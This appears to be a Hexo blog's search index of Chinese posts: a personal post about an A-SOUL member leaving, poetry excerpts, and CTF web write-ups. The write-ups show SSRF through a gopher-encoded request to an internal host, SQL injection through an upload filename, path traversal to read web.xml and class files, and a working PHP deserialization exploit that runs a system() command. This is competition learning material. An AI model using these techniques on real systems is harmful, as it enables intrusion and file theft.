<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>流量分析-陇剑杯</title>
    <link href="/2022/07/12/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90-%E9%99%87%E5%89%91%E6%9D%AF/"/>
    <url>/2022/07/12/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90-%E9%99%87%E5%89%91%E6%9D%AF/</url>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="抱歉，这个密码看着不太对，请再试试。" data-whm="抱歉，这个文章不能被纠正，不过您还是能看看解密后的内容。">  <script id="hbeData" type="hbeData" data-hmacdigest="4dab2f1b708d225dcf1e93fdf830f6df25df3d4d3a52505320e4fd414ae92d7e"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">🐨🐩🐪🐫🐬。</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    
    <tags>
      
      <tag>数据取证</tag>
      
      <tag>应急响应</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>关于“大哥”毕业</title>
    <link href="/2022/05/10/%E7%8F%88%E4%B9%90%E6%AF%95%E4%B8%9A/"/>
    <url>/2022/05/10/%E7%8F%88%E4%B9%90%E6%AF%95%E4%B8%9A/</url>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><blockquote><p>日 没什么内容，原来标题是关于珈乐毕业，但是想了一下还是别浪费大家的精力了</p></blockquote><iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=888 height=90 src="//music.163.com/outchain/player?type=2&id=583253&auto=1&height=66"></iframe><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202205102240413.png" alt="image-20220510224019333"></p><p>这…本来晚上在老袁直播间看大家聊 a卡 发售，突然就整了这么一出。</p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202205102241650.png" alt="image-20220510224159587"></p><p>​    不是一个很关注as的路人，每次直播也是一边看东西一边听直播 从嘉然20w+ 入坑。印象比较深刻的就是 bw，拉姐生日会(我不会直播我只会跳跳舞)，向晚生日会。asoul从入坑以来到现在真的有蛮大的成长，也能去恰点米了，然后从今年开始节奏开始多起来了，狗羊驼回回直播出问题。这波珈乐毕业，甚至没有告诉广大au们，直接整这么一出，然后让其他四个姑娘抗压，毕业会狠狠捞钱….有点无语，气愤。又想到拉姐最近接受了牛牛这个梗…</p><p>​    不太知道说什么了 贴一点我让我印象深刻 &#x2F; 老溜 的视频。之后怎么样看情况吧，能看继续看，不能看就算了</p><h2 id="视频列表"><a href="#视频列表" class="headerlink" title="视频列表"></a>视频列表</h2><h3 id="【A-SOUL】圆滚滚的女团"><a href="#【A-SOUL】圆滚滚的女团" class="headerlink" title="【A- SOUL】圆滚滚的女团"></a>【A- SOUL】圆滚滚的女团</h3><iframe src="//player.bilibili.com/player.html?aid=638696758&bvid=BV12Y4y1k7Ze&cid=710780449&page=1" scrolling="no" border="0" frameborder="no" framespacing="0" allowfullscreen="true" width=888 height=600> </iframe><h3 id="被小作文整破防的嘉然"><a href="#被小作文整破防的嘉然" class="headerlink" title="被小作文整破防的嘉然"></a>被小作文整破防的嘉然</h3><iframe src="//player.bilibili.com/player.html?aid=585919336&bvid=BV1bz4y1z7uu&cid=274106562&page=1" scrolling="no" border="0" frameborder="no" framespacing="0" allowfullscreen="true" width=888 height=600> </iframe><h3 id="现在，最让人引以为傲的话是：“我是一个嘉心糖。”"><a href="#现在，最让人引以为傲的话是：“我是一个嘉心糖。”" class="headerlink" title="现在，最让人引以为傲的话是：“我是一个嘉心糖。”"></a>现在，最让人引以为傲的话是：“我是一个嘉心糖。”</h3><iframe src="//player.bilibili.com/player.html?aid=931380923&bvid=BV17M4y1g7KS&cid=584113486&page=1" scrolling="no" border="0" frameborder="no" framespacing="0" allowfullscreen="true" width=888 height=600> </iframe><h3 id="我不会直播，但是大家一直和我说加油【字幕附】"><a href="#我不会直播，但是大家一直和我说加油【字幕附】" class="headerlink" title="我不会直播，但是大家一直和我说加油【字幕附】"></a>我不会直播，但是大家一直和我说加油【字幕附】</h3><iframe src="//player.bilibili.com/player.html?aid=931701043&bvid=BV1vM4y1K7tQ&cid=371196283&page=1" scrolling="no" border="0" frameborder="no" framespacing="0" allowfullscreen="true" width=888 height=600> </iframe><h3 id="太近了？就近就近！【A-SOUL贝拉七夕直播】"><a href="#太近了？就近就近！【A-SOUL贝拉七夕直播】" class="headerlink" title="太近了？就近就近！【A-SOUL贝拉七夕直播】"></a>太近了？就近就近！【A-SOUL贝拉七夕直播】</h3><iframe src="//player.bilibili.com/player.html?aid=974816202&bvid=BV1x44y1y7UU&cid=389183218&page=1" scrolling="no" border="0" frameborder="no" framespacing="0" allowfullscreen="true" width=888 height=600> </iframe><h3 id="已经陷在纯欲猫猫美少女向晚的魅力里面了🥰"><a href="#已经陷在纯欲猫猫美少女向晚的魅力里面了🥰" class="headerlink" title="已经陷在纯欲猫猫美少女向晚的魅力里面了🥰"></a>已经陷在纯欲猫猫美少女向晚的魅力里面了🥰</h3><iframe src="//player.bilibili.com/player.html?aid=937321269&bvid=BV1aT4y1U7dm&cid=551269125&page=1" scrolling="no" border="0" frameborder="no" framespacing="0" allowfullscreen="true" width=888 height=600> </iframe><h3 id="【洗脑小向晚】AvavaAvAAwawaAwAAbabaAbA"><a href="#【洗脑小向晚】AvavaAvAAwawaAwAAbabaAbA" class="headerlink" title="【洗脑小向晚】AvavaAvAAwawaAwAAbabaAbA"></a>【洗脑小向晚】AvavaAvAAwawaAwAAbabaAbA</h3><iframe src="//player.bilibili.com/player.html?aid=631281690&bvid=BV1Eb4y1C7oJ&cid=358798086&page=1" scrolling="no" border="0" frameborder="no" framespacing="0" allowfullscreen="true" width=888 height=600 > </iframe><h3 id="【A-SOUL-x2F-贝-amp-珈-amp-嘉】太潮啦！师徒三人演绎《隔岸-DJ-》"><a href="#【A-SOUL-x2F-贝-amp-珈-amp-嘉】太潮啦！师徒三人演绎《隔岸-DJ-》" class="headerlink" title="【A-SOUL&#x2F;贝&amp;珈&amp;嘉】太潮啦！师徒三人演绎《隔岸 (DJ)》"></a>【A-SOUL&#x2F;贝&amp;珈&amp;嘉】太潮啦！师徒三人演绎《隔岸 (DJ)》</h3><iframe src="//player.bilibili.com/player.html?aid=763015513&bvid=BV1M64y1a7zh&cid=411157817&page=1" scrolling="no" border="0" frameborder="no" framespacing="0" allowfullscreen="true" width=888 height=600> </iframe><h3 id="【珈乐】一记狼牙土豆拳直接击碎摄像机"><a href="#【珈乐】一记狼牙土豆拳直接击碎摄像机" class="headerlink" title="【珈乐】一记狼牙土豆拳直接击碎摄像机"></a>【珈乐】一记狼牙土豆拳直接击碎摄像机</h3><iframe src="//player.bilibili.com/player.html?aid=934434328&bvid=BV17M4y1P7hJ&cid=450902192&page=1" scrolling="no" border="0" frameborder="no" framespacing="0" allowfullscreen="true" width=888 height=600> </iframe><h3 id="【洗脑小向晚3-0】不要在这种时候推流啊！"><a href="#【洗脑小向晚3-0】不要在这种时候推流啊！" class="headerlink" title="【洗脑小向晚3.0】不要在这种时候推流啊！"></a>【洗脑小向晚3.0】不要在这种时候推流啊！</h3><iframe src="//player.bilibili.com/player.html?aid=378942867&bvid=BV1sf4y1u7bZ&cid=436790334&page=1" scrolling="no" border="0" frameborder="no" framespacing="0" allowfullscreen="true" width=888 height=600> </iframe><h3 id="身为女团一定要懂得察言观色、坚持不懈、先发制人-，所以我们今天练习…砍价！"><a href="#身为女团一定要懂得察言观色、坚持不懈、先发制人-，所以我们今天练习…砍价！" class="headerlink" title="身为女团一定要懂得察言观色、坚持不懈、先发制人 ，所以我们今天练习…砍价！"></a>身为女团一定要懂得察言观色、坚持不懈、先发制人 ，所以我们今天练习…砍价！</h3><iframe src="//player.bilibili.com/player.html?aid=212595213&bvid=BV1Ka411b7xP&cid=558615585&page=1" scrolling="no" border="0" frameborder="no" framespacing="0" allowfullscreen="true" width=888 height=600> </iframe><h3 id="ASOUL独有的体重管理方式"><a href="#ASOUL独有的体重管理方式" class="headerlink" title="ASOUL独有的体重管理方式"></a>ASOUL独有的体重管理方式</h3><iframe src="//player.bilibili.com/player.html?aid=808205832&bvid=BV1734y1i7Zo&cid=484168736&page=1" scrolling="no" border="0" frameborder="no" framespacing="0" allowfullscreen="true" width=888 height=600> </iframe><h3 id="【A-SOUL-x2F-嘉然】❤️届-不-到-的-爱❤️"><a href="#【A-SOUL-x2F-嘉然】❤️届-不-到-的-爱❤️" class="headerlink" title="【A-SOUL&#x2F;嘉然】❤️届 不 到 的 爱❤️"></a>【A-SOUL&#x2F;嘉然】❤️届 不 到 的 爱❤️</h3><iframe src="//player.bilibili.com/player.html?aid=418894919&bvid=BV1sV411x7o5&cid=361861017&page=1" scrolling="no" border="0" frameborder="no" framespacing="0" allowfullscreen="true" width=888 height=600> </iframe><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202205102322660.png" alt="image-20220510232252489"></p><center>A-SOUL</center>## 最后<p>哦 对了 最后的最后</p><iframe src="//player.bilibili.com/player.html?aid=683888192&bvid=BV1MU4y1S7zL&cid=716984359&page=1" scrolling="no" border="0" frameborder="no" framespacing="0" allowfullscreen="true" width=888 height=600> </iframe>]]></content>
    
    
    
    <tags>
      
      <tag>生活</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>网刃2022-web复现</title>
    <link href="/2022/04/27/%E7%BD%91%E5%88%832022-web%E5%A4%8D%E7%8E%B0/"/>
    <url>/2022/04/27/%E7%BD%91%E5%88%832022-web%E5%A4%8D%E7%8E%B0/</url>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="signin"><a href="#signin" class="headerlink" title="signin"></a>signin</h2><figure class="highlight php"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    highlight_file(<span class="hljs-keyword">__FILE__</span>);<br>    <span class="hljs-variable">$ch</span> = curl_init();<br>    curl_setopt(<span class="hljs-variable">$ch</span>, CURLOPT_URL, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;url&#x27;</span>]);<br>    curl_setopt(<span class="hljs-variable">$ch</span>, CURLOPT_HEADER, <span class="hljs-number">0</span>);<br>    curl_exec(<span class="hljs-variable">$ch</span>);<br>    curl_close(<span class="hljs-variable">$ch</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>一眼ssrf 利用 file 协议读取 到其他网段 <code>172.73.23.0</code></p><p>可以探测一下d段 <code>url/?url=http://172.73.23.100</code></p><p>得到</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    highlight_file(<span class="hljs-keyword">__FILE__</span>);<br>    <span class="hljs-variable">$ch</span> = curl_init();<br>    curl_setopt(<span class="hljs-variable">$ch</span>, CURLOPT_URL, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;url&#x27;</span>]);<br>    curl_setopt(<span class="hljs-variable">$ch</span>, CURLOPT_HEADER, <span class="hljs-number">0</span>);<br>    curl_exec(<span class="hljs-variable">$ch</span>);<br>    curl_close(<span class="hljs-variable">$ch</span>);<br><span class="hljs-meta">?&gt;</span> 先给俺GET一个a<br></code></pre></td></tr></table></figure><p>这个好说 <code>?url=http://172.73.23.100?a=1</code></p><p>然后就卡主了 这里post请求需要用到gopher，有几个点:</p><ul><li><p>需要传递Content-Type,Content-Length,host,post的参数</p></li><li><p>如果手动构造的话需要 抓包然后二次全编码</p></li></ul><p>用 <a href="https://blog.csdn.net/miuzzx/article/details/124386923?spm=1001.2014.3001.5501">yu22x</a> 师傅的思路</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/?a=123</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>172.73.23.100<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>5<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.88 Safari/537.36<br>X-Forwarded-For:127.0.0.1<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>bolean.club<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><br><span class="ini"><span class="hljs-attr">b</span>=<span class="hljs-number">456</span></span><br><span class="ini"></span><br></code></pre></td></tr></table></figure><p>之后对内容全编码 </p><p>按照这个格式 <code>gopher://172.73.26.100:80/_数据</code> 构造</p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202204272314328.png" alt="image-20220427231432117"></p><center>getFlag喽</center><h2 id="upload"><a href="#upload" class="headerlink" title="upload"></a>upload</h2><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202204280000966.png" alt="image-20220428000048862"></p><p>于是修改 Content-Type &#x3D;&gt; ctf</p><p>随后发现 <code>filename 字段为sql&#39;</code>  发现 出现MySQL的错误</p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202204280001501.png" alt="image-20220428000124408"></p><p>于是</p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202204280014701.png" alt="image-20220428001404624"></p><p>存在注入</p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202204280035310.png" alt="image-20220428003554216"></p><p>长度不够继续注入</p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202204280038168.png" alt="image-20220428003801071"></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">flag</span>&#123;<span class="hljs-number">5937</span>a<span class="hljs-number">0</span>b<span class="hljs-number">90</span>b<span class="hljs-number">5966939</span>cccd<span class="hljs-number">369291</span>c<span class="hljs-number">68</span>aa&#125;<br></code></pre></td></tr></table></figure><h2 id="ez-java"><a href="#ez-java" class="headerlink" title="ez_java"></a>ez_java</h2><p>java题一般都伴随着任意文件下载漏洞，找到下载文件复制下载链接</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span><span class="hljs-number">124.222</span>.<span class="hljs-number">24.150</span>:<span class="hljs-number">8025</span>/download?filename=<span class="hljs-number">1</span>.txt<br> ↓<br>http:<span class="hljs-regexp">//</span><span class="hljs-number">124.222</span>.<span class="hljs-number">24.150</span>:<span class="hljs-number">8025</span><span class="hljs-regexp">/download?filename=../</span>..<span class="hljs-regexp">/../</span>web.xml<br></code></pre></td></tr></table></figure><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202204280043951.png" alt="image-20220428004335881"></p><p>两个自定义类</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs gradle">download?filename=..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/classes/</span>com<span class="hljs-regexp">/abc/</span>servlet/DownloadServlet.<span class="hljs-keyword">class</span><br>download?filename=..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/classes/</span>com<span class="hljs-regexp">/abc/</span>servlet/TestServlet.<span class="hljs-keyword">class</span><br></code></pre></td></tr></table></figure><p>开摆…</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>分享-我的身体里早已落叶纷飞</title>
    <link href="/2022/04/26/%E5%88%86%E4%BA%AB-%E6%88%91%E7%9A%84%E8%BA%AB%E4%BD%93%E9%87%8C%E6%97%A9%E5%B7%B2%E8%90%BD%E5%8F%B6%E7%BA%B7%E9%A3%9E/"/>
    <url>/2022/04/26/%E5%88%86%E4%BA%AB-%E6%88%91%E7%9A%84%E8%BA%AB%E4%BD%93%E9%87%8C%E6%97%A9%E5%B7%B2%E8%90%BD%E5%8F%B6%E7%BA%B7%E9%A3%9E/</url>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=888 height=90 src="//music.163.com/outchain/player?type=2&id=441705&auto=1&height=66"></iframe><p>看这本是因为之前看了那本《我是你流浪过的一个地方》感觉不错买的，不过这本书带给我的感受没有上一本强烈。</p><h2 id="老家的亲人"><a href="#老家的亲人" class="headerlink" title="老家的亲人"></a>老家的亲人</h2><p>大姐家里的鸡蛋</p><p>二姐家里的红薯</p><p>弟弟家里的粉条</p><p>四婶用黄嵩自制的笤帚</p><p>他们都有自家的东西送我</p><p>让我背回城里去</p><p>回去的路上沉甸甸的</p><p>走着走着，桃花就开了</p><h2 id="一个鼻子太少"><a href="#一个鼻子太少" class="headerlink" title="一个鼻子太少"></a>一个鼻子太少</h2><p>山里的空气</p><p>刚刚被雨水洗过</p><p>早晨的小手轻轻拎起</p><p>挂满了整个院子</p><p>空气里有草木、泥土和牛粪的香味</p><p>一个鼻子太少</p><p>我动用全身的皮肤来呼吸</p><h2 id="春天常常思念的那个人"><a href="#春天常常思念的那个人" class="headerlink" title="春天常常思念的那个人"></a>春天常常思念的那个人</h2><p>春天常常思念的那个人</p><p>如今在秋风的凉里</p><p>也时时地想起来了</p><p>当初羞于启齿的话语</p><p>今日也不必说了</p><p>从头至尾</p><p>什么事也没有发生</p><p>无端的落下眼泪来</p><h2 id="我有一双像样的旧鞋子"><a href="#我有一双像样的旧鞋子" class="headerlink" title="我有一双像样的旧鞋子"></a>我有一双像样的旧鞋子</h2><p>风只有在吹动的时候</p><p>才是它自己</p><p>杨树在风中翻动树叶</p><p>并没有找到什么</p><p>我有一双像样的旧鞋子</p><p>年轻时爱过的伊人</p><p>也不必再见了</p>]]></content>
    
    
    <categories>
      
      <category>生活</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>2022DASCTF X SU 三月春季挑战赛 Web复现</title>
    <link href="/2022/04/23/2022DASCTF-X-SU-%E4%B8%89%E6%9C%88%E6%98%A5%E5%AD%A3%E6%8C%91%E6%88%98%E8%B5%9B-Web%E5%A4%8D%E7%8E%B0/"/>
    <url>/2022/04/23/2022DASCTF-X-SU-%E4%B8%89%E6%9C%88%E6%98%A5%E5%AD%A3%E6%8C%91%E6%88%98%E8%B5%9B-Web%E5%A4%8D%E7%8E%B0/</url>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><div class="note note-success">            <p>最近学习动力属实低下，记录一下这次赛后复现</p>          </div><h2 id="ezpop"><a href="#ezpop" class="headerlink" title="ezpop"></a>ezpop</h2><p>源码</p><figure class="highlight php"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></div></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">crow</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$v1</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$v2</span>;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">eval</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-keyword">new</span> <span class="hljs-keyword">$this</span>-&gt;v1(<span class="hljs-keyword">$this</span>-&gt;v2);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;v1-&gt;world();<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">fin</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$f1</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-keyword">$this</span>-&gt;f1 . <span class="hljs-string">&#x27;114514&#x27;</span>;<br>    &#125;<span class="hljs-comment">//f1=new what</span><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">run</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        (<span class="hljs-keyword">$this</span>-&gt;f1)();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$a</span>, <span class="hljs-variable">$b</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-keyword">$this</span>-&gt;f1-&gt;get_flag();<br>        <span class="hljs-comment">//f1=new mix</span><br>    &#125;<br><br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">what</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;a-&gt;run();<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;hello&#x27;</span>;<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">mix</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$m1</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">run</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        (<span class="hljs-keyword">$this</span>-&gt;m1)();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get_flag</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-string">&#x27;#&#x27;</span> . <span class="hljs-keyword">$this</span>-&gt;m1);<br>    &#125;<br><br>&#125;<br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>])) &#123;<br>    unserialize(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    highlight_file(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>exp</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">crow</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$v1</span>;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">fin</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$f1</span>;<br><br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">what</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span>;<br><br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">mix</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$m1</span>;<br>&#125;<br><span class="hljs-variable">$fin1</span> = <span class="hljs-keyword">new</span> fin();<br><span class="hljs-variable">$fin2</span> = <span class="hljs-keyword">new</span> fin();<br><span class="hljs-variable">$crow</span> = <span class="hljs-keyword">new</span> crow();<br><span class="hljs-variable">$what</span> = <span class="hljs-keyword">new</span> what();<br><span class="hljs-variable">$mix</span> = <span class="hljs-keyword">new</span> mix();<br><span class="hljs-variable">$mix2</span> = <span class="hljs-keyword">new</span> mix();<br><br><span class="hljs-variable">$fin1</span>-&gt;f1 = <span class="hljs-variable">$what</span>;<br><span class="hljs-variable">$what</span>-&gt;a = <span class="hljs-variable">$mix</span>;<br><span class="hljs-variable">$mix</span>-&gt;m1 = <span class="hljs-variable">$crow</span>;<br><span class="hljs-variable">$crow</span>-&gt;v1 = <span class="hljs-variable">$fin2</span>;<br><span class="hljs-variable">$fin2</span>-&gt;f1 = <span class="hljs-variable">$mix2</span>;<br><span class="hljs-variable">$mix2</span>-&gt;m1 = <span class="hljs-string">&quot;?&gt;&lt;?php system(&#x27;cat H0mvz850F.php&#x27;);?&gt;&quot;</span>;<br><span class="hljs-comment">//fin::destruct-&gt;what::toString-&gt;mix::run-&gt;crow::invoke-&gt;fin::call-&gt;mix::getflag</span><br><span class="hljs-keyword">echo</span> urlencode(serialize(<span class="hljs-variable">$fin1</span>));<br><br></code></pre></td></tr></table></figure><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202204251933863.png" 